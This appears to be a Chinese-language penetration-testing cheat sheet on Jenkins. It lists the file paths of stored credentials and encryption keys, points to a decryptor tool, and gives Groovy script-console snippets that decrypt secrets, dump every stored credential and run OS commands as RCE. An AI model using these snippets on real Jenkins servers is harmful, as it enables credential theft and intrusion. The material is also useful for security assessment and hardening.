# Jenkins

## Credentials凭据

Jenkins 将加密凭证存储在`credentials.xml`文件或`config.xml`. 要解密它们，您需要`master.key`和`hudson.util.Secret`文件。

所有文件都位于 Jenkins 主目录中：

```
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
$JENKINS_HOME/jobs/example-folder/config.xml - Possible location
```



可以使用工具https://github.com/hoto/jenkins-credentials-decryptor。

如果有script console，也可以利用script console解密：

```groovy
println(hudson.util.Secret.fromString("{AQAAABAAAAAw7KtB5kDGICXLmcURPTCV8NDtibl+a3Ypl1gXtLcmTjg7i6yiKQDCe+x0/CZZXEYkmqe92wPC4o8mKwJtZbgYXg==}").getPlainText())

println(hudson.util.Secret.decrypt("{AQAAABAAAAAw7KtB5kDGICXLmcURPTCV8NDtibl+a3Ypl1gXtLcmTjg7i6yiKQDCe+x0/CZZXEYkmqe92wPC4o8mKwJtZbgYXg==}"))

com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
  it.properties.each { prop, val ->
    println(prop + ' = "' + val + '"')
  }
  println("-----------------------")
}
```



## Script Console

位于`/script`。获得可以执行script console的用户权限的时候，可以在这里执行Groovy脚本：

![image-20231123155434585](README.assets/image-20231123155434585.png)



**RCE：**

```groovy
println "whoami".execute().text
```



**解密凭据：**

```groovy
println(hudson.util.Secret.fromString("{AQAAABAAAAAw7KtB5kDGICXLmcURPTCV8NDtibl+a3Ypl1gXtLcmTjg7i6yiKQDCe+x0/CZZXEYkmqe92wPC4o8mKwJtZbgYXg==}").getPlainText())

println(hudson.util.Secret.decrypt("{AQAAABAAAAAw7KtB5kDGICXLmcURPTCV8NDtibl+a3Ypl1gXtLcmTjg7i6yiKQDCe+x0/CZZXEYkmqe92wPC4o8mKwJtZbgYXg==}"))
```



也可以利用下面的命令解析：

```groovy
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
  it.properties.each { prop, val ->
    println(prop + ' = "' + val + '"')
  }
  println("-----------------------")
}
```



## 参考

https://www.freebuf.com/articles/web/376186.html